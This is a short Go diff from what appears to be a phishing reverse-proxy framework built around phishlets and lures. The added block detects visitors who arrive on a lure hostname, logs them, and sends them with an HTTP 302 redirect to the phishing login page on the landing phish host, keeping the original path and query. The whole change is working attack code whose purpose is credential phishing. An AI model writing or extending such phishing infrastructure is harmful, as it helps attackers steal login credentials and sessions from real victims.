@@ -633,6 +633,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									ps.Index = sid
 									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 
+									// if on a lure hostname, redirect to the phishing login page
+									if l.Hostname != "" && strings.EqualFold(l.Hostname, req.Host) {
+										landing_host := pl.GetLandingPhishHost()
+										if landing_host != "" {
+											login_url := pl.GetLoginUrl()
+											lu, lerr := url.Parse(login_url)
+											if lerr == nil {
+												redir_url := "https://" + landing_host + lu.Path
+												if lu.RawQuery != "" {
+													redir_url += "?" + lu.RawQuery
+												}
+												log.Info("[%d] [%s] lure hostname redirect: %s -> %s", sid, hiblue.Sprint(pl_name), req.Host, redir_url)
+												resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+												if resp != nil {
+													resp.Header.Add("Location", redir_url)
+													return req, resp
+												}
+											}
+										}
+									}
+
 									req_ok = true
 								}
 							} else {
